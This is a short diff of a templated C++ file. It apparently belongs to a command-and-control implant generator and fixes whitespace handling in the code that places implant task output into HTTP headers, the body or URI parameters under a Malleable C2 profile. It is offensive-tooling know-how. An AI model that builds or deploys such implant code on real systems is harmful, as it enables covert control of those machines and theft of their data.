@@ -196,15 +196,16 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
     //Need to check if ID is allowed in URI
 
     // 5. Handle Output Placement
-    [%- if http_post_client_output_terminator == "header" %]
+    [# no %- here, as otherwise the previous comment adds the below headers line in #]
+    [% if http_post_client_output_terminator == "header" %]
         headers.push_back(L"[[ http_post_client_output_terminator_value ]]: " + w_payload);
     [%- endif %]
 
-    [%- if http_post_client_output_terminator == "print" %]
+    [% if http_post_client_output_terminator == "print" %]
         final_post_body += w_payload;
     [%- endif %]
 
-    [%- if http_post_client_output_terminator == "parameter" %]
+    [% if http_post_client_output_terminator == "parameter" %]
         // This is dangerous for large output, but Malleable C2 allows it
         std::wstring w_body_param(w_payload.begin(), w_payload.end());
         if (uri.find(L"?") != std::wstring::npos) uri += L"&"; else uri += L"?";
